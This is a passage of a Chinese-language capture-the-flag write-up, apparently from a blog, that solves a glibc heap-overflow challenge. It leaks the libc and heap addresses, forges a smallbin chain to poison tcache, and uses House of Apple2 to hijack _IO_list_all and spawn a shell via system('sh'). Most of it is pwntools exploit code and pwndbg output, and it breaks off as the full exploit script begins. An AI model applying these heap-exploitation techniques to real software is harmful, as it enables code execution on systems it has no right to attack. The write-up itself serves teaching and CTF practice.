<span class="n">p</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">);</span>
<span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p>组合使用这两个 trick ，就可以往 unsorted bin 放入一个很大的堆块。并且后续也可以用第二个 trick 触发 unsorted bin 的遍历。</p>

<p>初次以外，本题中我们还需要使用第二个 trick 来往堆上预先放置一些数据。（这个技巧真的很牛）</p>

<p>具体利用时，还需要处理很多细节，步骤并不像这里说的这么直接。</p>

<h2 id="具体攻击流程解析">具体攻击流程解析</h2>

<h3 id="信息泄漏">信息泄漏</h3>

<p>本次攻击需要我们泄漏堆地址以及 LIBC 基址。</p>

<p>关于 LIBC 基址，只要将堆块释放到 unsorted bin 中再泄漏 fd 即可。这里我们使用 house of orange 所用到的 trick，将 top chunk size 溢出修改后，借用 <code class="language-plaintext highlighter-rouge">scanf()</code> 的缓冲区来触发 <code class="language-plaintext highlighter-rouge">malloc()</code>，将 top chunk 释放进入 unsorted bin。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd11</span><span class="p">))</span> <span class="c1"># original top chunk size: 0x??d11
</span><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger realloc to put top chunk into unsorted bin
</span></code></pre></div></div>

<p>然后，再触发一个溢出来把 fd 读出来，就可以计算出 libc 基址。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># overflow
</span><span class="n">show</span><span class="p">()</span>
<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
<span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcf1</span><span class="p">))</span> <span class="c1"># repair corrupted size
</span></code></pre></div></div>

<p>关于堆地址，最容易泄漏的是已释放堆块的 fd 指针。在本题中，我们只能接触到 tcache，但这不妨碍我们进行泄漏。</p>

<p>在 GLIBC 高版本中，虽然 tcache chunk 的 fd 指针会进行异或加密，但是用于加密的 key 本身就是堆地址 » 12，再考虑到 tcache bin 都是单向非循环链表，我们只要泄漏最后面的 chunk 的 fd 指针，就可以拿到堆地址。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># this chunk is split from old top chunk in unsorted bin
</span><span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># overflow
</span><span class="n">show</span><span class="p">()</span>
<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="c1"># leak tcache protect key
</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
<span class="n">free</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="smallbin-to-tcache本题关键">smallbin to tcache（本题关键）</h3>

<p>注意到，现在的堆布局在修复部分数据后，大致为这样：</p>

<pre><code class="language-pwndbg">Allocated chunk | PREV_INUSE
Addr: 0x5d6c2a054000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x5d6c2a054290
Size: 0x1010 (with flag bits: 0x1011)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5d6c2a0552a0
Size: 0x50 (with flag bits: 0x51)
fd: 0x5d6c2a055

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5d6c2a0552f0
Size: 0x90 (with flag bits: 0x91)
fd: 0x5d6c2a055

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5d6c2a055380
Size: 0xc60 (with flag bits: 0xc61)
fd: 0x7e3344a19ce0
bk: 0x7e3344a19ce0

Allocated chunk
Addr: 0x5d6c2a055fe0
Size: 0x10 (with flag bits: 0x10)

Allocated chunk | PREV_INUSE
Addr: 0x5d6c2a055ff0
Size: 0x10 (with flag bits: 0x11)
</code></pre>

<blockquote>
  <p><strong>位于原先的 top chunk 之后的两个 0x10 大小区块是什么？</strong>
在释放 top chunk 时，为了让 top chunk 在之后 <strong><code class="language-plaintext highlighter-rouge">malloc()</code> 遍历 unsorted bin 时</strong> 通过其中的各种检查，GLIBC 会预先在 top chunk 的最后放两个小区块。</p>

  <p>具体检查包括：</p>
  <ol>
    <li>当前堆块的 size 是否满足 0x10 &lt;= size &lt;= system_mem</li>
    <li>后一堆块的 size 是否满足 0x10 &lt;= size &lt;= system_mem</li>
    <li>后一堆块的 prev_size 是否和当前堆块的 size 相等</li>
    <li>当前堆块的 bck-&gt;fd 是否等于自己，以及 fd 是否指向 unsorted bin（注意这里使用的是前遍历）</li>
    <li>后一堆块的 prev_inuse 是否为 0</li>
  </ol>
</blockquote>

<p>我们之后需要 small bin 中至少有两个堆块，根据前文所述，我们可以先往其中塞一个堆块，然后使用溢出，来伪造一条 small bin 的 bk 链表。</p>

<p>我们的目标是 <code class="language-plaintext highlighter-rouge">smallbin[0x90]</code>，且后续需要一次绕过 tcache 的请求来触发 unsorted bin 大循环，将区块放入 <code class="language-plaintext highlighter-rouge">smallbin[0x90]</code> ，也就是说需要满足以下条件：</p>

<ol>
  <li>在 unsorted bin 中需要有一个 0x90 大小的堆块（这个 0x90 可以在堆块进入 unsorted bin 之后再使用溢出修改）；</li>
  <li>需要有一次大于 0x90 的 <code class="language-plaintext highlighter-rouge">malloc()</code>，且不能命中 Tcache。（用 scanf 就行了）</li>
</ol>

<p>现在在 tcache 中就有一个现成的 0x90 大小区块，一种想法是将其 size 改大后将其释放。问题在于，free() 为了进行后向合并，会检查后续区块的一些合法性，而由于 size 很大，我们不能够通过溢出来布置后续的 fake chunk。（注意区分这里 <code class="language-plaintext highlighter-rouge">free()</code> 对释放区块的检查以及 <code class="language-plaintext highlighter-rouge">malloc()</code> 对于 unsorted bin 中的区块的检查）</p>

<p>如果将要释放的堆块记为 chunk A，那么后续两个 chunk 需要满足：</p>
<ul>
  <li>chunk B：PREV_IN_USE 为 1</li>
  <li>chunk C：PREV_IN_USE 为 1
这样，<code class="language-plaintext highlighter-rouge">free()</code> 就不会尝试去合并后面的堆块。</li>
</ul>

<p>这里我们可以采用一种技巧来在堆上<em>提前布置</em>一些数据。之前提到，<code class="language-plaintext highlighter-rouge">scanf()</code> 会在堆上申请缓冲区，因此它一定会把读入的数据存在堆上。我们可以利用这种技术在堆上提前布置 fake chunk 的数据。</p>

<p>在 EXP 中，我们复用了 unsorted bin 的第二个哨兵堆块，并在后面使用技巧布置了一个哨兵堆块。</p>

<pre><code class="language-pwndbg">Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5ef482d912a0
Size: 0x50 (with flag bits: 0x51)
fd: 0x5ef482d91

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5ef482d912f0
Size: 0x90 (with flag bits: 0x91)
fd: 0x5ef482d91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5ef482d91380
Size: 0xc60 (with flag bits: 0xc61)
fd: 0x7cb42c819ce0
bk: 0x7cb42c819ce0

Allocated chunk
Addr: 0x5ef482d91fe0
Size: 0x10 (with flag bits: 0x10)

Allocated chunk | PREV_INUSE
Addr: 0x5ef482d91ff0
Size: 0x10 (with flag bits: 0x11)

Allocated chunk | PREV_INUSE | IS_MMAPED
Addr: 0x5ef482d92000
Size: 0x30 (with flag bits: 0x33) &lt;- 这个0x33的byte就是提前布置的

Allocated chunk
Addr: 0x5ef482d92030
Size: 0x00 (with flag bits: 0x00)
</code></pre>

<p>为了提前布置数据，我们在泄漏数据之前加入这样一行代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xd58</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span> <span class="c1"># arrange heap layout. '3' is a valid size. take effect in line 74
</span></code></pre></div></div>

<p>这个神秘的偏移可以通过动态调试拿到。这个’3’也就是 fake chunk 的 size 位。</p>

<p>在解决了后向合并问题之后，我们还需要考虑前向合并问题。显然，只要释放堆块的 PREV_IN_USE bit 是 1，那 <code class="language-plaintext highlighter-rouge">free()</code> 就不会尝试合并前面的堆块。</p>

<p>于是我们可以写出第一个版本的代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xd01</span><span class="p">))</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="p">)</span> <span class="c1"># tcache do not care how large the chunk it gives out (0xd01)
</span><span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk into small bin
</span></code></pre></div></div>

<p>在最后一个 <code class="language-plaintext highlighter-rouge">free()</code> 之前，位于 unsorted bin 中的那个目标堆块信息如下：</p>

<pre><code class="language-pwndbg">pwndbg&gt; bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x56cefdc442f0 —▸ 0x56cefdc44380 —▸ 0x702f51e19ce0 (main_arena+96) ◂— 0x56cefdc442f0
smallbins
empty
largebins
empty

pwndbg&gt; malloc_chunk 0x56cefdc442f0
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56cefdc442f0
Size: 0x90 (with flag bits: 0x91)
fd: 0x56cefdc44380
bk: 0x702f51e19ce0

pwndbg&gt; malloc_chunk 0x56cefdc442f0+0x90
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56cefdc44380
Size: 0xc60 (with flag bits: 0xc61)
fd: 0x702f51e19ce0
bk: 0x56cefdc442f0
</code></pre>

<p>然而，如果运行这段代码，会发现我们没有通过位于 unsorted bin 循环中的检测，也就是 top chunk 之后那两个哨兵堆块想要解决的那些检测。具体来说，我们想要放入 small bin 中的那个堆块之后的堆块（也就是 0x56cefdc442f0+0x90），其 PREV_INUSE bit 是 1，这就不能通过 <code class="language-plaintext highlighter-rouge">malloc()</code> 的检查。</p>

<p>为了通过这个检查，EXP 采用的方法也很精彩：在将目标堆块释放进入 unsorted bin 的时候，在其之前构造一个 fake chunk 并触发两个堆块的合并，从而将目标堆块起始位置前移。这样一来，我们就有机会在目标堆块+0x90 的位置提前布置好两个哨兵堆块。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xd00</span><span class="p">))</span> <span class="c1"># fake chunk to be consolidated with target chunk
</span><span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x11</span><span class="p">))</span> <span class="c1"># 2 guard fake chunk
</span><span class="n">free</span><span class="p">()</span> <span class="c1"># trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin
</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin
</span></code></pre></div></div>

<p>此时各个 bin 的状态：</p>

<pre><code class="language-pwndbg">pwndbg&gt; bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x5fb67444a380 —▸ 0x7978dba19ce0 (main_arena+96) ◂— 0x5fb67444a380
smallbins
0x90: 0x5fb67444a2c0 —▸ 0x7978dba19d60 (main_arena+224) ◂— 0x5fb67444a2c0
largebins
empty
</code></pre>

<p>可以看到，我们已经成功把一个堆块送入了 small bin。接下来就可以通过溢出来伪造一条 smallbin 的 bk 链表了。这里我们就伪造出一条有三个堆块的链表，以备后续使用。（不能再多了）</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># construct a fake smallbin-linked list
</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span>
    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span>
    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x219d60</span><span class="p">,</span>
<span class="p">]))</span>
<span class="n">free</span><span class="p">()</span>
</code></pre></div></div>

<p>此时，smallbin 数据如下：</p>

<pre><code class="language-pwndbg">smallbins
0x90 [corrupted]
FD: 0x5df1191ee2c0 ◂— 0x5df1191ee2c0
BK: 0x5df1191ee2c0 —▸ 0x5df1191ee2e0 —▸ 0x5df1191ee300 —▸ 0x74294ce19d60 (main_arena+224) ◂— 0x5df1191ee2c0
</code></pre>

<p>虽然 FD 链表和 BK 链表完全对不上，但是 malloc 在从 smallbin 取区块的过程中，都是以 bk 进行迭代的。我们接下来调用 <code class="language-plaintext highlighter-rouge">malloc(0x80)</code> ，就可以触发 smallbin to tcache 的过程：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># trigger smallbin-to-tcache process
</span><span class="n">free</span><span class="p">()</span>
</code></pre></div></div>

<p>此时各个 bin 状态如下：</p>

<pre><code class="language-pwndbg">tcachebins
0x50 [  1]: 0x61618d6c42b0 ◂— 0x0
0x90 [  3]: 0x61618d6c42d0 —▸ 0x61618d6c4310 —▸ 0x61618d6c42f0 ◂— 0x0
fastbins
empty
unsortedbin
all [corrupted]
FD: 0x61618d6c4380 —▸ 0x7f82b3e19ce0 (main_arena+96) ◂— 0x61618d6c4380
BK: 0x61618d6c4380 —▸ 0x7f82b3e19ce1 (main_arena+97) ◂— 0xf0000061618d6c43
smallbins
empty
largebins
empty
</code></pre>

<h3 id="tcache-poisoning--house-of-apple2">tcache poisoning &amp; House of Apple2</h3>

<p>由于可以进行溢出，我们已经可以进行 tcache poisoning 了，拥有一次任意写 0x90 字节的原语。接下来就可以通过各种方法将任意写扩大成为控制流劫持，这里我们就使用 House of Apple 2 进行攻击。关于这个手法，推荐参考 <a href="https://pwn.college/software-exploitation/file-struct-exploits">pwn.college 的 IOFILE 章节</a>。</p>

<p>注意到，0x90 字节小于一个完整的 <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code> 结构体大小。因此，如果直接尝试修改标准流的 FILE 结构体的话，是无法做到又改到 flag 又改到 vtable 指针的。</p>

<p>所以我们可以先在堆上伪造一个 <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code> 结构体，然后劫持 <code class="language-plaintext highlighter-rouge">_IO_list_all</code> 到我们的 fake FILE 结构体。我劫持的 vtable 函数是 <code class="language-plaintext highlighter-rouge">__overflow</code> ，这样会在程序退出时触发攻击。（<code class="language-plaintext highlighter-rouge">exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow</code>）</p>

<p>首先调试拿到一些偏移：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wide_data_off</span> <span class="o">=</span> <span class="mh">0xa0</span> <span class="c1"># wide data field in _IO_FILE
</span><span class="n">vtable_off</span> <span class="o">=</span> <span class="mh">0xd8</span> <span class="c1"># vtable field in _IO_FILE
</span><span class="n">wide_data_vtable_off</span> <span class="o">=</span> <span class="mh">0xe0</span> <span class="c1"># vtable field in wide_data FILE structure
</span>
<span class="n">_IO_wfile_overflow_ptr</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x2160d8</span> <span class="c1"># _IO_wfile_overflow address
</span><span class="n">__overflow_off</span> <span class="o">=</span> <span class="mh">0x18</span> <span class="c1"># overflow field offset in vtable
</span><span class="n">do_alloc_off</span> <span class="o">=</span> <span class="mh">0x68</span> <span class="c1"># do_alloc field offset in wide_data vtable
</span>
<span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a680</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x50d60</span>
</code></pre></div></div>

<p>然后开始进行攻击。</p>

<p>首先，溢出修改目前正位于 <code class="language-plaintext highlighter-rouge">tcache[0x90]</code> 最前面的堆块，将其 size 改小，fd 修改成该堆块+0x70 的位置。这里把 size 改小是为了之后使用完该堆块将其释放时，可以把该堆块放入另外的 tcache bin。而之所以 fd 是加 0x70，是因为这样我们在写入该堆块的时候，可以顺便设置位于 0x70 处（0x70~0x78）的 fd 指针，通过这种方式完成第二次 tcache poisoning。（这里说是 poisoning 其实不太准确，因为这里本来就没有 fd 指针，是一个完全的 fake chunk）</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)
</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d0</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)))</span>
<span class="n">free</span><span class="p">()</span>
</code></pre></div></div>

<p>然后，我们申请出刚才修改的这个堆块，在其中填入 IOFILE 结构体，顺便设置 fake chunk 的 fd 指针到 <code class="language-plaintext highlighter-rouge">_IO_list_all</code>。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span>
    <span class="mh">0x00</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="sa">b</span><span class="s">"  sh;"</span><span class="p">,</span> <span class="c1"># fake FILE struct starts at heap_base + 0x2e0
</span>    <span class="mh">0x28</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="n">system</span><span class="p">,</span>
    <span class="mh">0x58</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="mh">0x71</span><span class="p">,</span>
    <span class="mh">0x60</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="n">_IO_list_all</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">),</span>
<span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span>
<span class="n">free</span><span class="p">()</span>
</code></pre></div></div>

<p>接着我们申请出来的就是 0x70 偏移处的 fake chunk 了，可以在其中继续伪造 IOFILE 结构体。（注意我把 unused 的部分用来存放 widedata 的 vtable 指针）</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span> <span class="c1"># starts from heap_base + 0x2e0 + 0x60
</span>    <span class="n">wide_data_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0xd0</span> <span class="o">-</span> <span class="n">wide_data_vtable_off</span><span class="p">,</span>
    <span class="mh">0xd0</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>          <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">-</span> <span class="n">do_alloc_off</span><span class="p">,</span> <span class="c1"># `unused` in IOFILE
</span>    <span class="n">vtable_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>    <span class="n">_IO_wfile_overflow_ptr</span> <span class="o">-</span> <span class="n">__overflow_off</span><span class="p">,</span>
<span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">free</span><span class="p">()</span>
</code></pre></div></div>

<p>最后，我们把 <code class="language-plaintext highlighter-rouge">_IO_list_all</code> 申请出来并填上 fake IOFILE 结构体的地址，再触发程序退出，就可以拿到 shell。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span><span class="p">))</span>   <span class="c1"># hijack _IO_list_all
</span><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span> <span class="c1"># trigger exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow
</span></code></pre></div></div>

<h2 id="exp-脚本">EXP 脚本</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>

<span class="c1"># ---------------- Environment Config ---------------- #
</span>
<span class="c1">#context.log_level = 'debug'
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>

<span class="c1"># ------------------- Exploitation ------------------- #
</span>
<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span>       <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
